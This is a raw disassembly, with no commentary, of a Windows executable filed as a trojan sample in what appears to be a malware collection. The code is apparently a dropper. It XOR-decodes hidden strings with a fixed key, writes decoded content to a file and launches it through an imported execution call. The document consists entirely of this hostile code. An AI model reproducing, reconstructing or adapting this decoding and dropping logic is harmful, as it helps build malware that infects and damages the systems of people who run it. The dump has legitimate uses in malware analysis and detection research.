
malware_samples/trojan/5de978f6590f0bba5683ae43ddc98350425741d9d94416315848e0ecbfb9f89f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	81 ec 10 00 00 00    	sub    $0x10,%esp
  401009:	90                   	nop
  40100a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40100d:	40                   	inc    %eax
  40100e:	50                   	push   %eax
  40100f:	e8 34 05 00 00       	call   0x401548
  401014:	83 c4 04             	add    $0x4,%esp
  401017:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40101a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40101d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401020:	01 c1                	add    %eax,%ecx
  401022:	b8 00 00 00 00       	mov    $0x0,%eax
  401027:	88 01                	mov    %al,(%ecx)
  401029:	b8 00 00 00 00       	mov    $0x0,%eax
  40102e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401031:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401034:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401037:	39 c8                	cmp    %ecx,%eax
  401039:	0f 8d 48 00 00 00    	jge    0x401087
  40103f:	e9 09 00 00 00       	jmp    0x40104d
  401044:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401047:	40                   	inc    %eax
  401048:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40104b:	eb e4                	jmp    0x401031
  40104d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401050:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401053:	01 c1                	add    %eax,%ecx
  401055:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401058:	8b 55 08             	mov    0x8(%ebp),%edx
  40105b:	01 c2                	add    %eax,%edx
  40105d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401060:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401063:	b9 20 00 00 00       	mov    $0x20,%ecx
  401068:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40106b:	99                   	cltd
  40106c:	f7 f9                	idiv   %ecx
  40106e:	b8 00 20 40 00       	mov    $0x402000,%eax
  401073:	01 d0                	add    %edx,%eax
  401075:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401078:	0f be 09             	movsbl (%ecx),%ecx
  40107b:	0f be 10             	movsbl (%eax),%edx
  40107e:	31 d1                	xor    %edx,%ecx
  401080:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401083:	88 08                	mov    %cl,(%eax)
  401085:	eb bd                	jmp    0x401044
  401087:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40108a:	c9                   	leave
  40108b:	c3                   	ret
  40108c:	55                   	push   %ebp
  40108d:	89 e5                	mov    %esp,%ebp
  40108f:	81 ec 38 04 00 00    	sub    $0x438,%esp
  401095:	90                   	nop
  401096:	b8 0c 00 00 00       	mov    $0xc,%eax
  40109b:	50                   	push   %eax
  40109c:	b8 00 00 00 00       	mov    $0x0,%eax
  4010a1:	50                   	push   %eax
  4010a2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010a5:	50                   	push   %eax
  4010a6:	e8 a5 04 00 00       	call   0x401550
  4010ab:	83 c4 0c             	add    $0xc,%esp
  4010ae:	b8 21 20 40 00       	mov    $0x402021,%eax
  4010b3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4010b6:	b8 26 20 40 00       	mov    $0x402026,%eax
  4010bb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4010be:	b8 2d 20 40 00       	mov    $0x40202d,%eax
  4010c3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4010c6:	b8 10 00 00 00       	mov    $0x10,%eax
  4010cb:	50                   	push   %eax
  4010cc:	b8 00 00 00 00       	mov    $0x0,%eax
  4010d1:	50                   	push   %eax
  4010d2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010d5:	50                   	push   %eax
  4010d6:	e8 75 04 00 00       	call   0x401550
  4010db:	83 c4 0c             	add    $0xc,%esp
  4010de:	b8 04 00 00 00       	mov    $0x4,%eax
  4010e3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4010e6:	b8 06 00 00 00       	mov    $0x6,%eax
  4010eb:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4010ee:	b8 01 00 00 00       	mov    $0x1,%eax
  4010f3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010f6:	b8 00 00 00 00       	mov    $0x0,%eax
  4010fb:	89 85 d0 fb ff ff    	mov    %eax,-0x430(%ebp)
  401101:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  401107:	83 f8 01             	cmp    $0x1,%eax
  40110a:	0f 8d fe 01 00 00    	jge    0x40130e
  401110:	e9 0f 00 00 00       	jmp    0x401124
  401115:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40111b:	40                   	inc    %eax
  40111c:	89 85 d0 fb ff ff    	mov    %eax,-0x430(%ebp)
  401122:	eb dd                	jmp    0x401101
  401124:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40112a:	b9 0c 00 00 00       	mov    $0xc,%ecx
  40112f:	0f af c1             	imul   %ecx,%eax
  401132:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  401135:	01 c1                	add    %eax,%ecx
  401137:	b8 2e 20 40 00       	mov    $0x40202e,%eax
  40113c:	50                   	push   %eax
  40113d:	8b 01                	mov    (%ecx),%eax
  40113f:	50                   	push   %eax
  401140:	e8 13 04 00 00       	call   0x401558
  401145:	83 c4 08             	add    $0x8,%esp
  401148:	83 f8 00             	cmp    $0x0,%eax
  40114b:	0f 85 4a 00 00 00    	jne    0x40119b
  401151:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  401157:	b9 0c 00 00 00       	mov    $0xc,%ecx
  40115c:	0f af c1             	imul   %ecx,%eax
  40115f:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  401162:	01 c1                	add    %eax,%ecx
  401164:	83 c1 04             	add    $0x4,%ecx
  401167:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40116d:	c1 e0 04             	shl    $0x4,%eax
  401170:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  401173:	01 c2                	add    %eax,%edx
  401175:	83 c2 04             	add    $0x4,%edx
  401178:	8b 02                	mov    (%edx),%eax
  40117a:	50                   	push   %eax
  40117b:	8b 01                	mov    (%ecx),%eax
  40117d:	50                   	push   %eax
  40117e:	e8 7d fe ff ff       	call   0x401000
  401183:	83 c4 08             	add    $0x8,%esp
  401186:	50                   	push   %eax
  401187:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
  40118d:	50                   	push   %eax
  40118e:	e8 cd 03 00 00       	call   0x401560
  401193:	83 c4 08             	add    $0x8,%esp
  401196:	e9 90 00 00 00       	jmp    0x40122b
  40119b:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  4011a1:	b9 0c 00 00 00       	mov    $0xc,%ecx
  4011a6:	0f af c1             	imul   %ecx,%eax
  4011a9:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4011ac:	01 c1                	add    %eax,%ecx
  4011ae:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  4011b4:	c1 e0 04             	shl    $0x4,%eax
  4011b7:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4011ba:	01 c2                	add    %eax,%edx
  4011bc:	8b 02                	mov    (%edx),%eax
  4011be:	50                   	push   %eax
  4011bf:	8b 01                	mov    (%ecx),%eax
  4011c1:	50                   	push   %eax
  4011c2:	e8 39 fe ff ff       	call   0x401000
  4011c7:	83 c4 08             	add    $0x8,%esp
  4011ca:	50                   	push   %eax
  4011cb:	e8 98 03 00 00       	call   0x401568
  4011d0:	83 c4 04             	add    $0x4,%esp
  4011d3:	8b 8d d0 fb ff ff    	mov    -0x430(%ebp),%ecx
  4011d9:	ba 0c 00 00 00       	mov    $0xc,%edx
  4011de:	0f af ca             	imul   %edx,%ecx
  4011e1:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4011e4:	01 ca                	add    %ecx,%edx
  4011e6:	83 c2 04             	add    $0x4,%edx
  4011e9:	8b 8d d0 fb ff ff    	mov    -0x430(%ebp),%ecx
  4011ef:	c1 e1 04             	shl    $0x4,%ecx
  4011f2:	89 85 cc fb ff ff    	mov    %eax,-0x434(%ebp)
  4011f8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4011fb:	01 c8                	add    %ecx,%eax
  4011fd:	83 c0 04             	add    $0x4,%eax
  401200:	8b 08                	mov    (%eax),%ecx
  401202:	51                   	push   %ecx
  401203:	8b 02                	mov    (%edx),%eax
  401205:	50                   	push   %eax
  401206:	e8 f5 fd ff ff       	call   0x401000
  40120b:	83 c4 08             	add    $0x8,%esp
  40120e:	50                   	push   %eax
  40120f:	8b 85 cc fb ff ff    	mov    -0x434(%ebp),%eax
  401215:	50                   	push   %eax
  401216:	b8 40 20 40 00       	mov    $0x402040,%eax
  40121b:	50                   	push   %eax
  40121c:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
  401222:	50                   	push   %eax
  401223:	e8 48 03 00 00       	call   0x401570
  401228:	83 c4 10             	add    $0x10,%esp
  40122b:	b8 46 20 40 00       	mov    $0x402046,%eax
  401230:	50                   	push   %eax
  401231:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
  401237:	50                   	push   %eax
  401238:	e8 3b 03 00 00       	call   0x401578
  40123d:	83 c4 08             	add    $0x8,%esp
  401240:	89 85 c8 fb ff ff    	mov    %eax,-0x438(%ebp)
  401246:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40124c:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401251:	0f af c1             	imul   %ecx,%eax
  401254:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  401257:	01 c1                	add    %eax,%ecx
  401259:	83 c1 08             	add    $0x8,%ecx
  40125c:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  401262:	c1 e0 04             	shl    $0x4,%eax
  401265:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  401268:	01 c2                	add    %eax,%edx
  40126a:	83 c2 08             	add    $0x8,%edx
  40126d:	8b 02                	mov    (%edx),%eax
  40126f:	50                   	push   %eax
  401270:	8b 01                	mov    (%ecx),%eax
  401272:	50                   	push   %eax
  401273:	e8 88 fd ff ff       	call   0x401000
  401278:	83 c4 08             	add    $0x8,%esp
  40127b:	8b 8d d0 fb ff ff    	mov    -0x430(%ebp),%ecx
  401281:	c1 e1 04             	shl    $0x4,%ecx
  401284:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  401287:	01 ca                	add    %ecx,%edx
  401289:	83 c2 08             	add    $0x8,%edx
  40128c:	8b 8d c8 fb ff ff    	mov    -0x438(%ebp),%ecx
  401292:	51                   	push   %ecx
  401293:	b9 01 00 00 00       	mov    $0x1,%ecx
  401298:	51                   	push   %ecx
  401299:	8b 0a                	mov    (%edx),%ecx
  40129b:	51                   	push   %ecx
  40129c:	50                   	push   %eax
  40129d:	e8 de 02 00 00       	call   0x401580
  4012a2:	83 c4 10             	add    $0x10,%esp
  4012a5:	8b 85 c8 fb ff ff    	mov    -0x438(%ebp),%eax
  4012ab:	50                   	push   %eax
  4012ac:	e8 d7 02 00 00       	call   0x401588
  4012b1:	83 c4 04             	add    $0x4,%esp
  4012b4:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  4012ba:	c1 e0 04             	shl    $0x4,%eax
  4012bd:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4012c0:	01 c1                	add    %eax,%ecx
  4012c2:	83 c1 0c             	add    $0xc,%ecx
  4012c5:	8b 01                	mov    (%ecx),%eax
  4012c7:	83 f8 00             	cmp    $0x0,%eax
  4012ca:	0f 84 39 00 00 00    	je     0x401309
  4012d0:	b8 04 00 00 00       	mov    $0x4,%eax
  4012d5:	50                   	push   %eax
  4012d6:	b8 49 20 40 00       	mov    $0x402049,%eax
  4012db:	50                   	push   %eax
  4012dc:	e8 1f fd ff ff       	call   0x401000
  4012e1:	83 c4 08             	add    $0x8,%esp
  4012e4:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4012e9:	51                   	push   %ecx
  4012ea:	b9 00 00 00 00       	mov    $0x0,%ecx
  4012ef:	51                   	push   %ecx
  4012f0:	b9 00 00 00 00       	mov    $0x0,%ecx
  4012f5:	51                   	push   %ecx
  4012f6:	8d 8d d4 fb ff ff    	lea    -0x42c(%ebp),%ecx
  4012fc:	51                   	push   %ecx
  4012fd:	50                   	push   %eax
  4012fe:	b8 00 00 00 00       	mov    $0x0,%eax
  401303:	50                   	push   %eax
  401304:	e8 87 02 00 00       	call   0x401590
  401309:	e9 07 fe ff ff       	jmp    0x401115
  40130e:	b8 00 00 00 00       	mov    $0x0,%eax
  401313:	c9                   	leave
  401314:	c3                   	ret
  401315:	00 00                	add    %al,(%eax)
  401317:	00 55 89             	add    %dl,-0x77(%ebp)
  40131a:	e5 81                	in     $0x81,%eax
  40131c:	ec                   	in     (%dx),%al
  40131d:	08 00                	or     %al,(%eax)
  40131f:	00 00                	add    %al,(%eax)
  401321:	90                   	nop
  401322:	b8 00 00 00 00       	mov    $0x0,%eax
  401327:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40132a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40132d:	c1 e0 02             	shl    $0x2,%eax
  401330:	b9 00 30 40 00       	mov    $0x403000,%ecx
  401335:	01 c1                	add    %eax,%ecx
  401337:	b8 00 30 40 00       	mov    $0x403000,%eax
  40133c:	39 c1                	cmp    %eax,%ecx
  40133e:	0f 84 2e 00 00 00    	je     0x401372
  401344:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401347:	89 c1                	mov    %eax,%ecx
  401349:	40                   	inc    %eax
  40134a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40134d:	c1 e1 02             	shl    $0x2,%ecx
  401350:	b8 00 30 40 00       	mov    $0x403000,%eax
  401355:	01 c8                	add    %ecx,%eax
  401357:	8b 08                	mov    (%eax),%ecx
  401359:	8b 45 10             	mov    0x10(%ebp),%eax
  40135c:	50                   	push   %eax
  40135d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401360:	50                   	push   %eax
  401361:	8b 45 08             	mov    0x8(%ebp),%eax
  401364:	50                   	push   %eax
  401365:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401368:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40136b:	ff d0                	call   *%eax
  40136d:	83 c4 0c             	add    $0xc,%esp
  401370:	eb b8                	jmp    0x40132a
  401372:	c9                   	leave
  401373:	c3                   	ret
  401374:	55                   	push   %ebp
  401375:	89 e5                	mov    %esp,%ebp
  401377:	81 ec 08 00 00 00    	sub    $0x8,%esp
  40137d:	90                   	nop
  40137e:	b8 00 00 00 00       	mov    $0x0,%eax
  401383:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401386:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401389:	c1 e0 02             	shl    $0x2,%eax
  40138c:	b9 00 30 40 00       	mov    $0x403000,%ecx
  401391:	01 c1                	add    %eax,%ecx
  401393:	b8 00 30 40 00       	mov    $0x403000,%eax
  401398:	39 c1                	cmp    %eax,%ecx
  40139a:	0f 84 1d 00 00 00    	je     0x4013bd
  4013a0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4013a3:	48                   	dec    %eax
  4013a4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4013a7:	c1 e0 02             	shl    $0x2,%eax
  4013aa:	b9 00 30 40 00       	mov    $0x403000,%ecx
  4013af:	01 c1                	add    %eax,%ecx
  4013b1:	8b 01                	mov    (%ecx),%eax
  4013b3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4013b6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013b9:	ff d0                	call   *%eax
  4013bb:	eb c9                	jmp    0x401386
  4013bd:	c9                   	leave
  4013be:	c3                   	ret
  4013bf:	55                   	push   %ebp
  4013c0:	89 e5                	mov    %esp,%ebp
  4013c2:	81 ec 08 00 00 00    	sub    $0x8,%esp
  4013c8:	90                   	nop
  4013c9:	8b 45 10             	mov    0x10(%ebp),%eax
  4013cc:	50                   	push   %eax
  4013cd:	8b 45 0c             	mov    0xc(%ebp),%eax
  4013d0:	50                   	push   %eax
  4013d1:	8b 45 08             	mov    0x8(%ebp),%eax
  4013d4:	50                   	push   %eax
  4013d5:	e8 3e ff ff ff       	call   0x401318
  4013da:	83 c4 0c             	add    $0xc,%esp
  4013dd:	8b 05 c4 20 40 00    	mov    0x4020c4,%eax
  4013e3:	8b 0d c8 20 40 00    	mov    0x4020c8,%ecx
  4013e9:	8b 15 cc 20 40 00    	mov    0x4020cc,%edx
  4013ef:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4013f2:	8b 02                	mov    (%edx),%eax
  4013f4:	50                   	push   %eax
  4013f5:	8b 01                	mov    (%ecx),%eax
  4013f7:	50                   	push   %eax
  4013f8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013fb:	8b 00                	mov    (%eax),%eax
  4013fd:	50                   	push   %eax
  4013fe:	e8 89 fc ff ff       	call   0x40108c
  401403:	83 c4 0c             	add    $0xc,%esp
  401406:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401409:	e8 66 ff ff ff       	call   0x401374
  40140e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401411:	c9                   	leave
  401412:	c3                   	ret
  401413:	55                   	push   %ebp
  401414:	89 e5                	mov    %esp,%ebp
  401416:	81 ec 00 00 00 00    	sub    $0x0,%esp
  40141c:	90                   	nop
  40141d:	8b 45 08             	mov    0x8(%ebp),%eax
  401420:	8b 08                	mov    (%eax),%ecx
  401422:	8b 45 08             	mov    0x8(%ebp),%eax
  401425:	50                   	push   %eax
  401426:	8b 01                	mov    (%ecx),%eax
  401428:	50                   	push   %eax
  401429:	e8 6a 01 00 00       	call   0x401598
  40142e:	83 c4 08             	add    $0x8,%esp
  401431:	c9                   	leave
  401432:	c2 04 00             	ret    $0x4
  401435:	55                   	push   %ebp
  401436:	89 e5                	mov    %esp,%ebp
  401438:	81 ec 08 00 00 00    	sub    $0x8,%esp
  40143e:	90                   	nop
  40143f:	b8 04 00 00 00       	mov    $0x4,%eax
  401444:	50                   	push   %eax
  401445:	b8 00 00 00 00       	mov    $0x0,%eax
  40144a:	50                   	push   %eax
  40144b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40144e:	50                   	push   %eax
  40144f:	e8 fc 00 00 00       	call   0x401550
  401454:	83 c4 0c             	add    $0xc,%esp
  401457:	b8 13 14 40 00       	mov    $0x401413,%eax
  40145c:	50                   	push   %eax
  40145d:	e8 3e 01 00 00       	call   0x4015a0
  401462:	b8 01 00 00 00       	mov    $0x1,%eax
  401467:	50                   	push   %eax
  401468:	e8 3b 01 00 00       	call   0x4015a8
  40146d:	83 c4 04             	add    $0x4,%esp
  401470:	b8 00 00 03 00       	mov    $0x30000,%eax
  401475:	50                   	push   %eax
  401476:	b8 00 00 01 00       	mov    $0x10000,%eax
  40147b:	50                   	push   %eax
  40147c:	e8 2f 01 00 00       	call   0x4015b0
  401481:	83 c4 08             	add    $0x8,%esp
  401484:	8b 05 c4 20 40 00    	mov    0x4020c4,%eax
  40148a:	8b 0d c8 20 40 00    	mov    0x4020c8,%ecx
  401490:	8b 15 cc 20 40 00    	mov    0x4020cc,%edx
  401496:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401499:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40149c:	50                   	push   %eax
  40149d:	8b 05 00 30 40 00    	mov    0x403000,%eax
  4014a3:	50                   	push   %eax
  4014a4:	52                   	push   %edx
  4014a5:	51                   	push   %ecx
  4014a6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014a9:	50                   	push   %eax
  4014aa:	e8 09 01 00 00       	call   0x4015b8
  4014af:	83 c4 14             	add    $0x14,%esp
  4014b2:	8b 05 c4 20 40 00    	mov    0x4020c4,%eax
  4014b8:	8b 0d c8 20 40 00    	mov    0x4020c8,%ecx
  4014be:	8b 15 cc 20 40 00    	mov    0x4020cc,%edx
  4014c4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4014c7:	8b 02                	mov    (%edx),%eax
  4014c9:	50                   	push   %eax
  4014ca:	8b 01                	mov    (%ecx),%eax
  4014cc:	50                   	push   %eax
  4014cd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014d0:	8b 00                	mov    (%eax),%eax
  4014d2:	50                   	push   %eax
  4014d3:	e8 e7 fe ff ff       	call   0x4013bf
  4014d8:	83 c4 0c             	add    $0xc,%esp
  4014db:	50                   	push   %eax
  4014dc:	e8 df 00 00 00       	call   0x4015c0
  4014e1:	83 c4 04             	add    $0x4,%esp
  4014e4:	c9                   	leave
  4014e5:	c3                   	ret
  4014e6:	55                   	push   %ebp
  4014e7:	89 e5                	mov    %esp,%ebp
  4014e9:	81 ec 04 00 00 00    	sub    $0x4,%esp
  4014ef:	90                   	nop
  4014f0:	8b 05 c4 20 40 00    	mov    0x4020c4,%eax
  4014f6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4014f9:	89 08                	mov    %ecx,(%eax)
  4014fb:	8b 05 c8 20 40 00    	mov    0x4020c8,%eax
  401501:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401504:	89 08                	mov    %ecx,(%eax)
  401506:	b8 00 00 03 00       	mov    $0x30000,%eax
  40150b:	50                   	push   %eax
  40150c:	b8 00 00 01 00       	mov    $0x10000,%eax
  401511:	50                   	push   %eax
  401512:	e8 99 00 00 00       	call   0x4015b0
  401517:	83 c4 08             	add    $0x8,%esp
  40151a:	8b 05 c4 20 40 00    	mov    0x4020c4,%eax
  401520:	8b 0d c8 20 40 00    	mov    0x4020c8,%ecx
  401526:	8b 15 cc 20 40 00    	mov    0x4020cc,%edx
  40152c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40152f:	8b 02                	mov    (%edx),%eax
  401531:	50                   	push   %eax
  401532:	8b 01                	mov    (%ecx),%eax
  401534:	50                   	push   %eax
  401535:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401538:	8b 00                	mov    (%eax),%eax
  40153a:	50                   	push   %eax
  40153b:	e8 4c fb ff ff       	call   0x40108c
  401540:	83 c4 0c             	add    $0xc,%esp
  401543:	c9                   	leave
  401544:	c3                   	ret
  401545:	00 00                	add    %al,(%eax)
  401547:	00 ff                	add    %bh,%bh
  401549:	25 a0 20 40 00       	and    $0x4020a0,%eax
  40154e:	00 00                	add    %al,(%eax)
  401550:	ff 25 a4 20 40 00    	jmp    *0x4020a4
  401556:	00 00                	add    %al,(%eax)
  401558:	ff 25 a8 20 40 00    	jmp    *0x4020a8
  40155e:	00 00                	add    %al,(%eax)
  401560:	ff 25 ac 20 40 00    	jmp    *0x4020ac
  401566:	00 00                	add    %al,(%eax)
  401568:	ff 25 b0 20 40 00    	jmp    *0x4020b0
  40156e:	00 00                	add    %al,(%eax)
  401570:	ff 25 b4 20 40 00    	jmp    *0x4020b4
  401576:	00 00                	add    %al,(%eax)
  401578:	ff 25 b8 20 40 00    	jmp    *0x4020b8
  40157e:	00 00                	add    %al,(%eax)
  401580:	ff 25 bc 20 40 00    	jmp    *0x4020bc
  401586:	00 00                	add    %al,(%eax)
  401588:	ff 25 c0 20 40 00    	jmp    *0x4020c0
  40158e:	00 00                	add    %al,(%eax)
  401590:	ff 25 e8 20 40 00    	jmp    *0x4020e8
  401596:	00 00                	add    %al,(%eax)
  401598:	ff 25 d0 20 40 00    	jmp    *0x4020d0
  40159e:	00 00                	add    %al,(%eax)
  4015a0:	ff 25 f0 20 40 00    	jmp    *0x4020f0
  4015a6:	00 00                	add    %al,(%eax)
  4015a8:	ff 25 d4 20 40 00    	jmp    *0x4020d4
  4015ae:	00 00                	add    %al,(%eax)
  4015b0:	ff 25 d8 20 40 00    	jmp    *0x4020d8
  4015b6:	00 00                	add    %al,(%eax)
  4015b8:	ff 25 dc 20 40 00    	jmp    *0x4020dc
  4015be:	00 00                	add    %al,(%eax)
  4015c0:	ff 25 e0 20 40 00    	jmp    *0x4020e0
	...
